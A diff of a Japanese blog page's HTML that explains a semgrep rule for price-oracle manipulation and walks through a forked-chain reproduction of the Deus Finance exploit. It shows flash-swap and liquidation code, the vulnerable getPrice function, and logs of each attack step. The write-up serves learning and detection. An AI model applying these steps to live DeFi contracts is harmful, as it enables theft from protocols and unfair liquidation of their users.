@@ -184,25 +184,25 @@
 <p>このルールを実行すると、以下の2つがsemgrepによって検出されます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="mi">101</span><span class="err">┆</span> <span class="n">_sharePrice</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span>
-<span class="mi">102</span><span class="err">┆</span>     <span class="o">?</span> <span class="n">underlyingUnit</span>
-<span class="mi">103</span><span class="err">┆</span>     <span class="o">:</span> <span class="n">underlyingUnit</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">balanceWithInvested</span><span class="p">()).</span><span class="n">div</span><span class="p">(</span><span class="n">totalSupply</span><span class="p">());</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="mi">101</span><span class="err">┆</span> <span class="n">_sharePrice</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">102</span><span class="err">┆</span>     <span class="o">?</span> <span class="n">underlyingUnit</span>
+</span></span><span class="line"><span class="cl"><span class="mi">103</span><span class="err">┆</span>     <span class="o">:</span> <span class="n">underlyingUnit</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">balanceWithInvested</span><span class="p">()).</span><span class="n">div</span><span class="p">(</span><span class="n">totalSupply</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="mi">355</span><span class="err">┆</span> <span class="p">((</span><span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">usdc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e12</span><span class="p">))</span> <span class="o">*</span>
-<span class="mi">356</span><span class="err">┆</span>     <span class="mi">1</span><span class="n">e18</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">();</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="mi">355</span><span class="err">┆</span> <span class="p">((</span><span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">usdc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e12</span><span class="p">))</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="mi">356</span><span class="err">┆</span>     <span class="mi">1</span><span class="n">e18</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>ルールと、何が検出されるのかは分かったものの、これだけでは何が脆弱なのか分からないので、エクスプロイトを調べてみます。</p>
 <h4 id="エクスプロイト">
@@ -231,20 +231,20 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 もともと <code>hardhat.config.js</code> に指定されているURLではダメなようなので、<code>https://rpc.fantom.network/</code>に変更して動作させます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript">      <span class="nx">forking</span><span class="o">:</span> <span class="p">{</span>
-        <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;https://rpc.fantom.network/&#34;</span><span class="p">,</span>
-        <span class="nx">blockNumber</span><span class="o">:</span> <span class="mi">33466613</span>
-      <span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">      <span class="nx">forking</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;https://rpc.fantom.network/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">blockNumber</span><span class="o">:</span> <span class="mi">33466613</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>npx hardhat run scripts/main.js</code> コマンドを実行すると、以下のような出力が得られます。</p>
-<pre><code>    [+] (0) before attack
+<pre tabindex="0"><code>    [+] (0) before attack
     [+]      my USDC balance: 0
     [+]      my DEI balance: 0
     [+]      spirit USDC reserve: 9713881664165
@@ -316,15 +316,15 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 <p><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps">https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">spiritUsdcDei</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">_reserve1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)));</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">spiritUsdcDei</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">_reserve1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)));</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>この借り入れは、オラクルを操作した後、ユーザーの負債を返却する際に利用されます。</p>
 <p>swapのコールバック関数の中で、<code>my DEI balance</code>が大きく増えていることが確認できます。</p>
-<pre><code>    [+] (1) flash swap from spirit pool
+<pre tabindex="0"><code>    [+] (1) flash swap from spirit pool
     [+]      my USDC balance: 0
     [+]      my DEI balance: 9739342685820948870544270
     [+]      sAMM USDC reserve: 24660757275320
@@ -347,14 +347,14 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 <p>このようにして大量に借り入れることで価値が下がり、ユーザーの清算処理を行うことができます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">_reserve1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)));</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">_reserve1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)));</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>借り入れ後、さらに<code>my DEI balance</code>が上昇していることが分かります。</p>
-<pre><code>    [+] (2) flash swap from sAMM pool
+<pre tabindex="0"><code>    [+] (2) flash swap from sAMM pool
     [+]      my USDC balance: 0
     [+]      my DEI balance: 34512141035026034261244476
     [+]      my LP deposit token balance: 0
@@ -373,18 +373,18 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 <p>以下のコードが呼び出され、特定のユーザーに対して清算処理が行われます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">dei</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="n">deiLenderSolidex</span><span class="p">.</span><span class="n">mintHelper</span><span class="p">(),</span> <span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">me</span><span class="p">));</span>
-<span class="n">deiLenderSolidex</span><span class="p">.</span><span class="n">liquidate</span><span class="p">(</span><span class="n">victims</span><span class="p">,</span> <span class="n">me</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">dei</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="n">deiLenderSolidex</span><span class="p">.</span><span class="n">mintHelper</span><span class="p">(),</span> <span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">me</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">deiLenderSolidex</span><span class="p">.</span><span class="n">liquidate</span><span class="p">(</span><span class="n">victims</span><span class="p">,</span> <span class="n">me</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>清算処理が実行されると、以下のコードが呼び出されます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -397,18 +397,18 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">function</span> <span class="nf">isSolvent</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// accrue must have already been called!
-</span><span class="c1"></span>
-    <span class="kt">uint256</span> <span class="n">userCollateralAmount</span> <span class="o">=</span> <span class="n">userCollateral</span><span class="p">[</span><span class="n">user</span><span class="p">];</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">userCollateralAmount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">getDebt</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
-
-    <span class="k">return</span>
-        <span class="n">userCollateralAmount</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">oracle</span><span class="p">.</span><span class="n">getPrice</span><span class="p">()).</span><span class="n">mul</span><span class="p">(</span><span class="n">LIQUIDATION_RATIO</span><span class="p">)</span> <span class="o">/</span>
-            <span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="n">e18</span><span class="p">).</span><span class="n">mul</span><span class="p">(</span><span class="mi">1</span><span class="n">e18</span><span class="p">))</span> <span class="o">&gt;</span>
-        <span class="n">getDebt</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">isSolvent</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// accrue must have already been called!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">userCollateralAmount</span> <span class="o">=</span> <span class="n">userCollateral</span><span class="p">[</span><span class="n">user</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">userCollateralAmount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">getDebt</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="n">userCollateralAmount</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">oracle</span><span class="p">.</span><span class="n">getPrice</span><span class="p">()).</span><span class="n">mul</span><span class="p">(</span><span class="n">LIQUIDATION_RATIO</span><span class="p">)</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="n">e18</span><span class="p">).</span><span class="n">mul</span><span class="p">(</span><span class="mi">1</span><span class="n">e18</span><span class="p">))</span> <span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">getDebt</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>このとき、清算処理が実際に行われるかどうかを判断するために、getPrice関数が呼び出されます。
 この関数は、プールしてあるDEIとUSDCの量から、DEIの価格を返却する関数です。</p>
@@ -416,21 +416,21 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 そのため、担保割れしていると判断され、清算処理が行われます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">function</span> <span class="nf">getPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span>
-        <span class="p">((</span><span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">usdc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e12</span><span class="p">))</span> <span class="o">*</span>
-            <span class="mi">1</span><span class="n">e18</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">getPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">((</span><span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">usdc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e12</span><span class="p">))</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="n">e18</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><pre><code>    [+] (3) liquidate the assets of victims
+</div><pre tabindex="0"><code>    [+] (3) liquidate the assets of victims
     [+]      my USDC balance: 0
     [+]      my DEI balance: 27150599219672207566872765
     [+]      my LP deposit token balance: 5230026958164438186
@@ -448,7 +448,7 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 <p>攻撃の肝となる部分はほとんど終わったため、ここから先はフラッシュスワップの返却やLPトークンの売却などが行われます。</p>
 <p>このステップでは、ステップ2で借り入れていたDEIの返却を行っています。</p>
 <p>ログから、<code>my DEI balance</code>が低下していることが分かります。</p>
-<pre><code>    [+] (4) exit the flash swap from sAMM pool
+<pre tabindex="0"><code>    [+] (4) exit the flash swap from sAMM pool
     [+]      my USDC balance: 0
     [+]      my DEI balance: 2375323342879442899705842
     [+]      my LP deposit token balance: 5230026958164438186
@@ -464,7 +464,7 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
     5 ) LPトークンの引き出し
 </h5>
 <p>depositされているLPトークンを引き出します。</p>
-<pre><code>    [+] (5) deposit LP deposit tokens to earn LP tokens
+<pre tabindex="0"><code>    [+] (5) deposit LP deposit tokens to earn LP tokens
     [+]      my LP deposit token balance: 0
     [+]      my LP token balance: 5230026958164438186
 </code></pre><h5 id="6--lpトークンのburn">
@@ -481,22 +481,22 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 <p><a href="https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works">https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="c1">// prepare the LP burning
-</span><span class="c1"></span><span class="n">ERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sAMMUsdcDei</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sAMMUsdcDei</span><span class="p">),</span> <span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">me</span><span class="p">));</span>
-
-<span class="c1">// burn the LP
-</span><span class="c1"></span><span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">burn</span><span class="p">(</span><span class="n">me</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// prepare the LP burning
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ERC20</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sAMMUsdcDei</span><span class="p">)).</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sAMMUsdcDei</span><span class="p">),</span> <span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">me</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// burn the LP
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">burn</span><span class="p">(</span><span class="n">me</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>my LP token balance</code>が0になり、<code>my USDC balance</code> / <code>my DEI balance</code>が増加していることが分かります。</p>
-<pre><code>    [+] (6) remove liquidity
+<pre tabindex="0"><code>    [+] (6) remove liquidity
     [+]      my USDC balance: 5218173124837
     [+]      my DEI balance: 7617204163068582172512381
     [+]      my LP token balance: 0
@@ -512,7 +512,7 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 </h5>
 <p>フラッシュローンの返却のため、USDCをDEIへスワップします。</p>
 <p>ログにより、<code>my USDC balance</code>が0に、<code>my DEI balance</code>が増えていることが確認できます。</p>
-<pre><code>    [+] (7) swap USDC to DEI from sAMM pool
+<pre tabindex="0"><code>    [+] (7) swap USDC to DEI from sAMM pool
     [+]      my USDC balance: 0
     [+]      my DEI balance: 12787419360961504871925327
 </code></pre><h5 id="8--ステップ1でフラッシュスワップしたものを返却">
@@ -526,7 +526,7 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
     8 ) ステップ1でフラッシュスワップしたものを返却
 </h5>
 <p>これで、借りたDEI以上の資金を用意できたため、フラッシュスワップが正常に終了します。</p>
-<pre><code>    [+] (8) exit the flash swap from spirit pool
+<pre tabindex="0"><code>    [+] (8) exit the flash swap from spirit pool
     [+]      my USDC balance: 0
     [+]      my DEI balance: 3018770729245407709894965
 </code></pre><h5 id="9--deiをusdcへスワップ">
@@ -540,7 +540,7 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
     9 ) DEIをUSDCへスワップ
 </h5>
 <p>最終的に、3064570164495ドルが得られます。</p>
-<pre><code>    [+] (9) swap DEI to USDC from sAMM pool
+<pre tabindex="0"><code>    [+] (9) swap DEI to USDC from sAMM pool
     [+]      my USDC balance: 3064570164495
     [+]      my DEI balance: 0
 </code></pre><h4 id="修正">
@@ -600,7 +600,7 @@ Deus Financeというプロジェクトで、この手法を用いたハッキ�
 
         
     </section>
-    <script defer src="/ts/features.6bec993050976e7360ece802de9df50f61459197c14bd32823dc2d8da0ee964c.js" 
+    <script defer src="/ts/features.706a523ba43e6d0427c7fdf2b9d05dbd0920d3f12942b453690b495cb2522743.js" 
     data-enable-footnotes="true"
     ></script>
 </footer>
